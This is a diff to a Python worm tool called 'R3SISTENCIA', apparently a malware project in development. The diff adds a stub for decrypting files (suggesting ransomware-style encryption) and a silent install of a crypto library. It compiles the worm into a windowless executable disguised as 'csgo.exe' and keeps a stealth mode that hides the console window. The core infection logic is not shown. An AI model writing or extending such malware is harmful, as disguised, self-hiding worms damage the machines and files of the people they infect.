@@ -47,6 +47,10 @@ class Worm:
             worm_poli += line
 
 
+
+    def decrypt_files(self):
+        pass
+
     def execute_worm(self):
         if not self.directories_found:
             self.find_directories()
@@ -65,14 +69,15 @@ def worm_menu():
     print(' --------------------------------- ')
     print('|      R 3 S I S T 3 N C I A      |')
     print(' --------------------------------- ')
-    print('| [+] 1 => Launch Worm!           |')
-    print('| [+] 2 => Make It Executable!    |')
-    print('| [+] 3 => Run Worm in Stealth!   |')
-    print('| [!] 0 => Exit!                  |')
+    print('| [+] 1 => Launch Worm            |')
+    print('| [+] 2 => Make It Executable     |')
+    print('| [+] 3 => Run Worm in Stealth    |')
+    print('| [+] 4 => Decrypt files          |')
+    print('| [!] 0 => Exit                   |')
     print(' --------------------------------- ')
 
 if __name__ == "__main__":
-    system("pip install pypiwin32 pyinstaller > /dev/null 2>&1") # /dev/null 2>&1 -> esconder o output
+    system("pip install pypiwin32 pyinstaller pycryptodome > /dev/null 2>&1") # /dev/null 2>&1 -> esconder o output
     system("cls")
 
     banner_func()
@@ -86,23 +91,23 @@ if __name__ == "__main__":
         opt = int(input("Operation: "))
         time.sleep(1)
         match opt:
-            case 1:
+            case 1: # modo normal
                 print("[!] Running Worm!")
                 print('[!] Press [Ctrl] + [C] to Stop!')
                 worm.execute_worm()
-            case 2:
+            case 2: # criação de executável
                 print("[+] Creating EXE of Worm!")
                 print('[!] Press [Ctrl] + [C] to Stop!')
-                time.sleep(2)
+                time.sleep(1)
 
-                os.system("pyinstaller resistencia-worm.py --onefile --noconsole")
-                print("[!] resistencia-worm.exe Created")
-            case 3:
+                os.system("pyinstaller resistencia_exe.py --onefile --noconsole --name csgo")
+                print("[!] csgo.exe Created")
+            case 3: # modo furtivo
                 hide = win32gui.GetForegroundWindow()
                 win32gui.ShowWindow(hide, win32con.SW_HIDE)
-                time.sleep(2)
-
                 worm.execute_worm()
+            case 4: # desencriptar ficheiros
+                pass
             case 0:
                 print("[!] Quitting...")
                 time.sleep(1.5)
